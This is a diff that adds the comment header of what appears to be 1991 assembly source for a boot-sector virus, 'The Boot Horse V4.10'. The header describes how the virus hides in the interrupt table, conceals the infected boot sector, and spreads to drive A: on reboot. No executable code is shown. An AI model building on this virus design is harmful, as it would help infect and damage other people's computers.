@@ -1,0 +1,16 @@
+	;******************************************
+	;                                         *
+	;       Code masters LTD. presents:       *
+	;         THE BOOT HORSE V4.10            *
+	;     Finished on the 25.04.1991.         *
+	; This is a boot virus,which does not     *
+	; "cuts" memory.It places itself into the *
+	; second part of the interrupt table.If   *
+	; it is resident you will not be able to  *
+	; see the infected boot sector.If you     *
+	; press CTRL-ALT-DEL & INT 13h had not    *
+	; been changed,drive A: will be infected. *
+	; It shows you the message 'Brr...!' with *
+	; possibility 1/16.                       *
+	;                        Good luck!       *
+	;******************************************
